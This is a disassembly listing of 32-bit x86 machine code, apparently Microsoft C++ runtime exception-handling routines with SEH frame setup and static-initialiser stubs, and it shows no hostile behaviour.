  409fe0:	e8 7a 9b ff ff       	call   0x403b5f
  409fe5:	8b 75 08             	mov    0x8(%ebp),%esi
  409fe8:	bf 63 73 6d e0       	mov    $0xe06d7363,%edi
  409fed:	39 3e                	cmp    %edi,(%esi)
  409fef:	0f 85 a5 01 00 00    	jne    0x40a19a
  409ff5:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  409ff9:	0f 85 9b 01 00 00    	jne    0x40a19a
  409fff:	8b 46 14             	mov    0x14(%esi),%eax
  40a002:	3b c3                	cmp    %ebx,%eax
  40a004:	74 12                	je     0x40a018
  40a006:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  40a00b:	74 0b                	je     0x40a018
  40a00d:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  40a012:	0f 85 82 01 00 00    	jne    0x40a19a
  40a018:	8b 7d 18             	mov    0x18(%ebp),%edi
  40a01b:	83 7f 0c 00          	cmpl   $0x0,0xc(%edi)
  40a01f:	0f 86 dc 00 00 00    	jbe    0x40a101
  40a025:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40a028:	50                   	push   %eax
  40a029:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40a02c:	50                   	push   %eax
  40a02d:	ff 75 f8             	push   -0x8(%ebp)
  40a030:	ff 75 20             	push   0x20(%ebp)
  40a033:	57                   	push   %edi
  40a034:	e8 5b f4 ff ff       	call   0x409494
  40a039:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40a03c:	83 c4 14             	add    $0x14,%esp
  40a03f:	3b 4d e0             	cmp    -0x20(%ebp),%ecx
  40a042:	0f 83 b9 00 00 00    	jae    0x40a101
  40a048:	8d 78 10             	lea    0x10(%eax),%edi
  40a04b:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40a04e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40a051:	8d 47 f0             	lea    -0x10(%edi),%eax
  40a054:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40a057:	39 08                	cmp    %ecx,(%eax)
  40a059:	0f 8f 8a 00 00 00    	jg     0x40a0e9
  40a05f:	3b 4f f4             	cmp    -0xc(%edi),%ecx
  40a062:	0f 8f 81 00 00 00    	jg     0x40a0e9
  40a068:	8b 07                	mov    (%edi),%eax
  40a06a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40a06d:	8b 47 fc             	mov    -0x4(%edi),%eax
  40a070:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40a073:	85 c0                	test   %eax,%eax
  40a075:	7e 72                	jle    0x40a0e9
  40a077:	8b 46 1c             	mov    0x1c(%esi),%eax
  40a07a:	8b 40 0c             	mov    0xc(%eax),%eax
  40a07d:	8d 58 04             	lea    0x4(%eax),%ebx
  40a080:	8b 00                	mov    (%eax),%eax
  40a082:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40a085:	85 c0                	test   %eax,%eax
  40a087:	7e 23                	jle    0x40a0ac
  40a089:	ff 76 1c             	push   0x1c(%esi)
  40a08c:	8b 03                	mov    (%ebx),%eax
  40a08e:	50                   	push   %eax
  40a08f:	ff 75 f4             	push   -0xc(%ebp)
  40a092:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40a095:	e8 a4 f5 ff ff       	call   0x40963e
  40a09a:	83 c4 0c             	add    $0xc,%esp
  40a09d:	85 c0                	test   %eax,%eax
  40a09f:	75 1a                	jne    0x40a0bb
  40a0a1:	ff 4d ec             	decl   -0x14(%ebp)
  40a0a4:	83 c3 04             	add    $0x4,%ebx
  40a0a7:	39 45 ec             	cmp    %eax,-0x14(%ebp)
  40a0aa:	7f dd                	jg     0x40a089
  40a0ac:	ff 4d e8             	decl   -0x18(%ebp)
  40a0af:	83 45 f4 10          	addl   $0x10,-0xc(%ebp)
  40a0b3:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  40a0b7:	7f be                	jg     0x40a077
  40a0b9:	eb 2e                	jmp    0x40a0e9
  40a0bb:	ff 75 24             	push   0x24(%ebp)
  40a0be:	8b 7d d8             	mov    -0x28(%ebp),%edi
  40a0c1:	ff 75 20             	push   0x20(%ebp)
  40a0c4:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  40a0c7:	ff 75 dc             	push   -0x24(%ebp)
  40a0ca:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  40a0ce:	ff 75 18             	push   0x18(%ebp)
  40a0d1:	ff 75 14             	push   0x14(%ebp)
  40a0d4:	ff 75 10             	push   0x10(%ebp)
  40a0d7:	56                   	push   %esi
  40a0d8:	8b 75 0c             	mov    0xc(%ebp),%esi
  40a0db:	e8 17 fc ff ff       	call   0x409cf7
  40a0e0:	8b 75 08             	mov    0x8(%ebp),%esi
  40a0e3:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  40a0e6:	83 c4 1c             	add    $0x1c,%esp
  40a0e9:	ff 45 f0             	incl   -0x10(%ebp)
  40a0ec:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40a0ef:	83 c7 14             	add    $0x14,%edi
  40a0f2:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40a0f5:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  40a0f8:	0f 82 50 ff ff ff    	jb     0x40a04e
  40a0fe:	8b 7d 18             	mov    0x18(%ebp),%edi
  40a101:	80 7d 1c 00          	cmpb   $0x0,0x1c(%ebp)
  40a105:	74 0a                	je     0x40a111
  40a107:	6a 01                	push   $0x1
  40a109:	56                   	push   %esi
  40a10a:	e8 fe f6 ff ff       	call   0x40980d
  40a10f:	59                   	pop    %ecx
  40a110:	59                   	pop    %ecx
  40a111:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  40a115:	0f 85 ae 00 00 00    	jne    0x40a1c9
  40a11b:	8b 07                	mov    (%edi),%eax
  40a11d:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
  40a122:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  40a127:	0f 82 9c 00 00 00    	jb     0x40a1c9
  40a12d:	8b 7f 1c             	mov    0x1c(%edi),%edi
  40a130:	85 ff                	test   %edi,%edi
  40a132:	0f 84 91 00 00 00    	je     0x40a1c9
  40a138:	56                   	push   %esi
  40a139:	e8 4d f7 ff ff       	call   0x40988b
  40a13e:	59                   	pop    %ecx
  40a13f:	84 c0                	test   %al,%al
  40a141:	0f 85 82 00 00 00    	jne    0x40a1c9
  40a147:	e8 39 c5 ff ff       	call   0x406685
  40a14c:	e8 34 c5 ff ff       	call   0x406685
  40a151:	e8 2f c5 ff ff       	call   0x406685
  40a156:	89 b0 88 00 00 00    	mov    %esi,0x88(%eax)
  40a15c:	e8 24 c5 ff ff       	call   0x406685
  40a161:	83 7d 24 00          	cmpl   $0x0,0x24(%ebp)
  40a165:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40a168:	89 88 8c 00 00 00    	mov    %ecx,0x8c(%eax)
  40a16e:	56                   	push   %esi
  40a16f:	75 05                	jne    0x40a176
  40a171:	ff 75 0c             	push   0xc(%ebp)
  40a174:	eb 03                	jmp    0x40a179
  40a176:	ff 75 24             	push   0x24(%ebp)
  40a179:	e8 e3 f0 ff ff       	call   0x409261
  40a17e:	8b 75 18             	mov    0x18(%ebp),%esi
  40a181:	6a ff                	push   $0xffffffff
  40a183:	56                   	push   %esi
  40a184:	ff 75 14             	push   0x14(%ebp)
  40a187:	ff 75 0c             	push   0xc(%ebp)
  40a18a:	e8 5d f5 ff ff       	call   0x4096ec
  40a18f:	83 c4 10             	add    $0x10,%esp
  40a192:	ff 76 1c             	push   0x1c(%esi)
  40a195:	e8 67 f7 ff ff       	call   0x409901
  40a19a:	8b 5d 18             	mov    0x18(%ebp),%ebx
  40a19d:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  40a1a1:	76 26                	jbe    0x40a1c9
  40a1a3:	80 7d 1c 00          	cmpb   $0x0,0x1c(%ebp)
  40a1a7:	0f 85 ff fd ff ff    	jne    0x409fac
  40a1ad:	ff 75 24             	push   0x24(%ebp)
  40a1b0:	ff 75 20             	push   0x20(%ebp)
  40a1b3:	ff 75 f8             	push   -0x8(%ebp)
  40a1b6:	53                   	push   %ebx
  40a1b7:	ff 75 14             	push   0x14(%ebp)
  40a1ba:	ff 75 10             	push   0x10(%ebp)
  40a1bd:	ff 75 0c             	push   0xc(%ebp)
  40a1c0:	56                   	push   %esi
  40a1c1:	e8 9f fb ff ff       	call   0x409d65
  40a1c6:	83 c4 20             	add    $0x20,%esp
  40a1c9:	e8 b7 c4 ff ff       	call   0x406685
  40a1ce:	83 b8 94 00 00 00 00 	cmpl   $0x0,0x94(%eax)
  40a1d5:	74 05                	je     0x40a1dc
  40a1d7:	e8 10 cc ff ff       	call   0x406dec
  40a1dc:	5f                   	pop    %edi
  40a1dd:	5e                   	pop    %esi
  40a1de:	5b                   	pop    %ebx
  40a1df:	c9                   	leave
  40a1e0:	c3                   	ret
  40a1e1:	8b ff                	mov    %edi,%edi
  40a1e3:	55                   	push   %ebp
  40a1e4:	8b ec                	mov    %esp,%ebp
  40a1e6:	56                   	push   %esi
  40a1e7:	ff 75 08             	push   0x8(%ebp)
  40a1ea:	8b f1                	mov    %ecx,%esi
  40a1ec:	e8 78 90 ff ff       	call   0x403269
  40a1f1:	c7 06 2c d4 40 00    	movl   $0x40d42c,(%esi)
  40a1f7:	8b c6                	mov    %esi,%eax
  40a1f9:	5e                   	pop    %esi
  40a1fa:	5d                   	pop    %ebp
  40a1fb:	c2 04 00             	ret    $0x4
  40a1fe:	8b ff                	mov    %edi,%edi
  40a200:	55                   	push   %ebp
  40a201:	8b ec                	mov    %esp,%ebp
  40a203:	53                   	push   %ebx
  40a204:	56                   	push   %esi
  40a205:	57                   	push   %edi
  40a206:	e8 7a c4 ff ff       	call   0x406685
  40a20b:	83 b8 0c 02 00 00 00 	cmpl   $0x0,0x20c(%eax)
  40a212:	8b 45 18             	mov    0x18(%ebp),%eax
  40a215:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a218:	bf 63 73 6d e0       	mov    $0xe06d7363,%edi
  40a21d:	be ff ff ff 1f       	mov    $0x1fffffff,%esi
  40a222:	bb 22 05 93 19       	mov    $0x19930522,%ebx
  40a227:	75 20                	jne    0x40a249
  40a229:	8b 11                	mov    (%ecx),%edx
  40a22b:	3b d7                	cmp    %edi,%edx
  40a22d:	74 1a                	je     0x40a249
  40a22f:	81 fa 26 00 00 80    	cmp    $0x80000026,%edx
  40a235:	74 12                	je     0x40a249
  40a237:	8b 10                	mov    (%eax),%edx
  40a239:	23 d6                	and    %esi,%edx
  40a23b:	3b d3                	cmp    %ebx,%edx
  40a23d:	72 0a                	jb     0x40a249
  40a23f:	f6 40 20 01          	testb  $0x1,0x20(%eax)
  40a243:	0f 85 93 00 00 00    	jne    0x40a2dc
  40a249:	f6 41 04 66          	testb  $0x66,0x4(%ecx)
  40a24d:	74 23                	je     0x40a272
  40a24f:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  40a253:	0f 84 83 00 00 00    	je     0x40a2dc
  40a259:	83 7d 1c 00          	cmpl   $0x0,0x1c(%ebp)
  40a25d:	75 7d                	jne    0x40a2dc
  40a25f:	6a ff                	push   $0xffffffff
  40a261:	50                   	push   %eax
  40a262:	ff 75 14             	push   0x14(%ebp)
  40a265:	ff 75 0c             	push   0xc(%ebp)
  40a268:	e8 7f f4 ff ff       	call   0x4096ec
  40a26d:	83 c4 10             	add    $0x10,%esp
  40a270:	eb 6a                	jmp    0x40a2dc
  40a272:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  40a276:	75 12                	jne    0x40a28a
  40a278:	8b 10                	mov    (%eax),%edx
  40a27a:	23 d6                	and    %esi,%edx
  40a27c:	81 fa 21 05 93 19    	cmp    $0x19930521,%edx
  40a282:	72 58                	jb     0x40a2dc
  40a284:	83 78 1c 00          	cmpl   $0x0,0x1c(%eax)
  40a288:	74 52                	je     0x40a2dc
  40a28a:	39 39                	cmp    %edi,(%ecx)
  40a28c:	75 32                	jne    0x40a2c0
  40a28e:	83 79 10 03          	cmpl   $0x3,0x10(%ecx)
  40a292:	72 2c                	jb     0x40a2c0
  40a294:	39 59 14             	cmp    %ebx,0x14(%ecx)
  40a297:	76 27                	jbe    0x40a2c0
  40a299:	8b 51 1c             	mov    0x1c(%ecx),%edx
  40a29c:	8b 52 08             	mov    0x8(%edx),%edx
  40a29f:	85 d2                	test   %edx,%edx
  40a2a1:	74 1d                	je     0x40a2c0
  40a2a3:	0f b6 75 24          	movzbl 0x24(%ebp),%esi
  40a2a7:	56                   	push   %esi
  40a2a8:	ff 75 20             	push   0x20(%ebp)
  40a2ab:	ff 75 1c             	push   0x1c(%ebp)
  40a2ae:	50                   	push   %eax
  40a2af:	ff 75 14             	push   0x14(%ebp)
  40a2b2:	ff 75 10             	push   0x10(%ebp)
  40a2b5:	ff 75 0c             	push   0xc(%ebp)
  40a2b8:	51                   	push   %ecx
  40a2b9:	ff d2                	call   *%edx
  40a2bb:	83 c4 20             	add    $0x20,%esp
  40a2be:	eb 1f                	jmp    0x40a2df
  40a2c0:	ff 75 20             	push   0x20(%ebp)
  40a2c3:	ff 75 1c             	push   0x1c(%ebp)
  40a2c6:	ff 75 24             	push   0x24(%ebp)
  40a2c9:	50                   	push   %eax
  40a2ca:	ff 75 14             	push   0x14(%ebp)
  40a2cd:	ff 75 10             	push   0x10(%ebp)
  40a2d0:	ff 75 0c             	push   0xc(%ebp)
  40a2d3:	51                   	push   %ecx
  40a2d4:	e8 93 fb ff ff       	call   0x409e6c
  40a2d9:	83 c4 20             	add    $0x20,%esp
  40a2dc:	33 c0                	xor    %eax,%eax
  40a2de:	40                   	inc    %eax
  40a2df:	5f                   	pop    %edi
  40a2e0:	5e                   	pop    %esi
  40a2e1:	5b                   	pop    %ebx
  40a2e2:	5d                   	pop    %ebp
  40a2e3:	c3                   	ret
  40a2e4:	cc                   	int3
  40a2e5:	cc                   	int3
  40a2e6:	cc                   	int3
  40a2e7:	cc                   	int3
  40a2e8:	cc                   	int3
  40a2e9:	cc                   	int3
  40a2ea:	cc                   	int3
  40a2eb:	cc                   	int3
  40a2ec:	cc                   	int3
  40a2ed:	cc                   	int3
  40a2ee:	cc                   	int3
  40a2ef:	cc                   	int3
  40a2f0:	55                   	push   %ebp
  40a2f1:	8b ec                	mov    %esp,%ebp
  40a2f3:	83 ec 04             	sub    $0x4,%esp
  40a2f6:	53                   	push   %ebx
  40a2f7:	51                   	push   %ecx
  40a2f8:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a2fb:	83 c0 0c             	add    $0xc,%eax
  40a2fe:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a301:	8b 45 08             	mov    0x8(%ebp),%eax
  40a304:	55                   	push   %ebp
  40a305:	ff 75 10             	push   0x10(%ebp)
  40a308:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40a30b:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  40a30e:	e8 69 d0 ff ff       	call   0x40737c
  40a313:	56                   	push   %esi
  40a314:	57                   	push   %edi
  40a315:	ff d0                	call   *%eax
  40a317:	5f                   	pop    %edi
  40a318:	5e                   	pop    %esi
  40a319:	8b dd                	mov    %ebp,%ebx
  40a31b:	5d                   	pop    %ebp
  40a31c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40a31f:	55                   	push   %ebp
  40a320:	8b eb                	mov    %ebx,%ebp
  40a322:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  40a328:	75 05                	jne    0x40a32f
  40a32a:	b9 02 00 00 00       	mov    $0x2,%ecx
  40a32f:	51                   	push   %ecx
  40a330:	e8 47 d0 ff ff       	call   0x40737c
  40a335:	5d                   	pop    %ebp
  40a336:	59                   	pop    %ecx
  40a337:	5b                   	pop    %ebx
  40a338:	c9                   	leave
  40a339:	c2 0c 00             	ret    $0xc
  40a33c:	50                   	push   %eax
  40a33d:	64 ff 35 00 00 00 00 	push   %fs:0x0
  40a344:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40a348:	2b 64 24 0c          	sub    0xc(%esp),%esp
  40a34c:	53                   	push   %ebx
  40a34d:	56                   	push   %esi
  40a34e:	57                   	push   %edi
  40a34f:	89 28                	mov    %ebp,(%eax)
  40a351:	8b e8                	mov    %eax,%ebp
  40a353:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  40a358:	33 c5                	xor    %ebp,%eax
  40a35a:	50                   	push   %eax
  40a35b:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40a35e:	ff 75 fc             	push   -0x4(%ebp)
  40a361:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40a368:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40a36b:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40a371:	c3                   	ret
  40a372:	8b ff                	mov    %edi,%edi
  40a374:	55                   	push   %ebp
  40a375:	8b ec                	mov    %esp,%ebp
  40a377:	33 c0                	xor    %eax,%eax
  40a379:	40                   	inc    %eax
  40a37a:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40a37e:	75 02                	jne    0x40a382
  40a380:	33 c0                	xor    %eax,%eax
  40a382:	5d                   	pop    %ebp
  40a383:	c3                   	ret
  40a384:	cc                   	int3
  40a385:	cc                   	int3
  40a386:	cc                   	int3
  40a387:	cc                   	int3
  40a388:	cc                   	int3
  40a389:	cc                   	int3
  40a38a:	cc                   	int3
  40a38b:	cc                   	int3
  40a38c:	cc                   	int3
  40a38d:	cc                   	int3
  40a38e:	cc                   	int3
  40a38f:	cc                   	int3
  40a390:	8b 54 24 08          	mov    0x8(%esp),%edx
  40a394:	8d 42 0c             	lea    0xc(%edx),%eax
  40a397:	8b 4a dc             	mov    -0x24(%edx),%ecx
  40a39a:	33 c8                	xor    %eax,%ecx
  40a39c:	e8 dd 8c ff ff       	call   0x40307e
  40a3a1:	b8 6c db 40 00       	mov    $0x40db6c,%eax
  40a3a6:	e9 0a ef ff ff       	jmp    0x4092b5
  40a3ab:	cc                   	int3
  40a3ac:	cc                   	int3
  40a3ad:	cc                   	int3
  40a3ae:	cc                   	int3
  40a3af:	cc                   	int3
  40a3b0:	8b 54 24 08          	mov    0x8(%esp),%edx
  40a3b4:	8d 42 0c             	lea    0xc(%edx),%eax
  40a3b7:	8b 4a d8             	mov    -0x28(%edx),%ecx
  40a3ba:	33 c8                	xor    %eax,%ecx
  40a3bc:	e8 bd 8c ff ff       	call   0x40307e
  40a3c1:	b8 f8 db 40 00       	mov    $0x40dbf8,%eax
  40a3c6:	e9 ea ee ff ff       	jmp    0x4092b5
  40a3cb:	cc                   	int3
  40a3cc:	cc                   	int3
  40a3cd:	cc                   	int3
  40a3ce:	cc                   	int3
  40a3cf:	cc                   	int3
  40a3d0:	8d 75 08             	lea    0x8(%ebp),%esi
  40a3d3:	e9 f8 73 ff ff       	jmp    0x4017d0
  40a3d8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40a3db:	83 e0 01             	and    $0x1,%eax
  40a3de:	0f 84 0c 00 00 00    	je     0x40a3f0
  40a3e4:	83 65 f0 fe          	andl   $0xfffffffe,-0x10(%ebp)
  40a3e8:	8b 75 ec             	mov    -0x14(%ebp),%esi
  40a3eb:	e9 10 74 ff ff       	jmp    0x401800
  40a3f0:	c3                   	ret
  40a3f1:	8b 54 24 08          	mov    0x8(%esp),%edx
  40a3f5:	8d 42 0c             	lea    0xc(%edx),%eax
  40a3f8:	8b 4a ec             	mov    -0x14(%edx),%ecx
  40a3fb:	33 c8                	xor    %eax,%ecx
  40a3fd:	e8 7c 8c ff ff       	call   0x40307e
  40a402:	b8 2c dc 40 00       	mov    $0x40dc2c,%eax
  40a407:	e9 a9 ee ff ff       	jmp    0x4092b5
  40a40c:	cc                   	int3
  40a40d:	cc                   	int3
  40a40e:	cc                   	int3
  40a40f:	cc                   	int3
  40a410:	8d 45 08             	lea    0x8(%ebp),%eax
  40a413:	e9 58 6e ff ff       	jmp    0x401270
  40a418:	8b 54 24 08          	mov    0x8(%esp),%edx
  40a41c:	8d 42 0c             	lea    0xc(%edx),%eax
  40a41f:	8b 8a 70 ff ff ff    	mov    -0x90(%edx),%ecx
  40a425:	33 c8                	xor    %eax,%ecx
  40a427:	e8 52 8c ff ff       	call   0x40307e
  40a42c:	8b 4a f8             	mov    -0x8(%edx),%ecx
  40a42f:	33 c8                	xor    %eax,%ecx
  40a431:	e8 48 8c ff ff       	call   0x40307e
  40a436:	b8 58 dc 40 00       	mov    $0x40dc58,%eax
  40a43b:	e9 75 ee ff ff       	jmp    0x4092b5
  40a440:	8d b5 cc f9 ff ff    	lea    -0x634(%ebp),%esi
  40a446:	e9 b5 73 ff ff       	jmp    0x401800
  40a44b:	8d 85 c8 f9 ff ff    	lea    -0x638(%ebp),%eax
  40a451:	e9 1a 6e ff ff       	jmp    0x401270
  40a456:	8d 85 c8 f9 ff ff    	lea    -0x638(%ebp),%eax
  40a45c:	e9 0f 6e ff ff       	jmp    0x401270
  40a461:	8b 54 24 08          	mov    0x8(%esp),%edx
  40a465:	8d 42 0c             	lea    0xc(%edx),%eax
  40a468:	8b 8a bc f9 ff ff    	mov    -0x644(%edx),%ecx
  40a46e:	33 c8                	xor    %eax,%ecx
  40a470:	e8 09 8c ff ff       	call   0x40307e
  40a475:	8b 4a fc             	mov    -0x4(%edx),%ecx
  40a478:	33 c8                	xor    %eax,%ecx
  40a47a:	e8 ff 8b ff ff       	call   0x40307e
  40a47f:	b8 9c dc 40 00       	mov    $0x40dc9c,%eax
  40a484:	e9 2c ee ff ff       	jmp    0x4092b5
  40a489:	cc                   	int3
  40a48a:	cc                   	int3
  40a48b:	cc                   	int3
  40a48c:	cc                   	int3
  40a48d:	cc                   	int3
  40a48e:	cc                   	int3
  40a48f:	cc                   	int3
  40a490:	8d 75 d0             	lea    -0x30(%ebp),%esi
  40a493:	e9 68 73 ff ff       	jmp    0x401800
  40a498:	8b 54 24 08          	mov    0x8(%esp),%edx
  40a49c:	8d 42 c4             	lea    -0x3c(%edx),%eax
  40a49f:	8b 4a c0             	mov    -0x40(%edx),%ecx
  40a4a2:	33 c8                	xor    %eax,%ecx
  40a4a4:	e8 d5 8b ff ff       	call   0x40307e
  40a4a9:	83 c0 04             	add    $0x4,%eax
  40a4ac:	8b 4a f8             	mov    -0x8(%edx),%ecx
  40a4af:	33 c8                	xor    %eax,%ecx
  40a4b1:	e8 c8 8b ff ff       	call   0x40307e
  40a4b6:	b8 c8 dc 40 00       	mov    $0x40dcc8,%eax
  40a4bb:	e9 f5 ed ff ff       	jmp    0x4092b5
  40a4c0:	8b 54 24 08          	mov    0x8(%esp),%edx
  40a4c4:	8d 42 0c             	lea    0xc(%edx),%eax
  40a4c7:	8b 4a ec             	mov    -0x14(%edx),%ecx
  40a4ca:	33 c8                	xor    %eax,%ecx
  40a4cc:	e8 ad 8b ff ff       	call   0x40307e
  40a4d1:	b8 68 dd 40 00       	mov    $0x40dd68,%eax
  40a4d6:	e9 da ed ff ff       	jmp    0x4092b5
  40a4db:	cc                   	int3
  40a4dc:	cc                   	int3
  40a4dd:	cc                   	int3
  40a4de:	cc                   	int3
  40a4df:	cc                   	int3
  40a4e0:	68 40 a5 40 00       	push   $0x40a540
  40a4e5:	e8 e9 93 ff ff       	call   0x4038d3
  40a4ea:	59                   	pop    %ecx
  40a4eb:	c3                   	ret
  40a4ec:	b9 e0 07 41 00       	mov    $0x4107e0,%ecx
  40a4f1:	e8 32 89 ff ff       	call   0x402e28
  40a4f6:	68 6e a5 40 00       	push   $0x40a56e
  40a4fb:	e8 d3 93 ff ff       	call   0x4038d3
  40a500:	59                   	pop    %ecx
  40a501:	c3                   	ret
  40a502:	ff 15 ac b0 40 00    	call   *0x40b0ac
  40a508:	68 78 a5 40 00       	push   $0x40a578
  40a50d:	c7 05 18 08 41 00 50 	movl   $0x40b250,0x410818
  40a514:	b2 40 00 
  40a517:	a3 1c 08 41 00       	mov    %eax,0x41081c
  40a51c:	c6 05 20 08 41 00 00 	movb   $0x0,0x410820
  40a523:	e8 ab 93 ff ff       	call   0x4038d3
  40a528:	59                   	pop    %ecx
  40a529:	c3                   	ret
  40a52a:	68 82 a5 40 00       	push   $0x40a582
  40a52f:	e8 9f 93 ff ff       	call   0x4038d3
  40a534:	59                   	pop    %ecx
  40a535:	c3                   	ret
  40a536:	cc                   	int3
  40a537:	cc                   	int3
  40a538:	cc                   	int3
  40a539:	cc                   	int3
  40a53a:	cc                   	int3
  40a53b:	cc                   	int3
  40a53c:	cc                   	int3
  40a53d:	cc                   	int3
  40a53e:	cc                   	int3
  40a53f:	cc                   	int3
  40a540:	83 3d b0 07 41 00 10 	cmpl   $0x10,0x4107b0
  40a547:	72 0e                	jb     0x40a557
  40a549:	a1 9c 07 41 00       	mov    0x41079c,%eax
  40a54e:	50                   	push   %eax
  40a54f:	e8 1f 8b ff ff       	call   0x403073
  40a554:	83 c4 04             	add    $0x4,%esp
  40a557:	33 c0                	xor    %eax,%eax
  40a559:	c7 05 b0 07 41 00 0f 	movl   $0xf,0x4107b0
  40a560:	00 00 00 
  40a563:	a3 ac 07 41 00       	mov    %eax,0x4107ac
  40a568:	a2 9c 07 41 00       	mov    %al,0x41079c
  40a56d:	c3                   	ret
  40a56e:	b9 e0 07 41 00       	mov    $0x4107e0,%ecx
  40a573:	e9 3b 88 ff ff       	jmp    0x402db3
  40a578:	b9 18 08 41 00       	mov    $0x410818,%ecx
  40a57d:	e9 e6 88 ff ff       	jmp    0x402e68
  40a582:	c7 05 60 f0 40 00 64 	movl   $0x40b264,0x40f060
  40a589:	b2 40 00 
  40a58c:	c3                   	ret
  40a58d:	c7 05 24 08 41 00 a8 	movl   $0x40b2a8,0x410824
  40a594:	b2 40 00 
  40a597:	b9 24 08 41 00       	mov    $0x410824,%ecx
  40a59c:	e9 96 8c ff ff       	jmp    0x403237
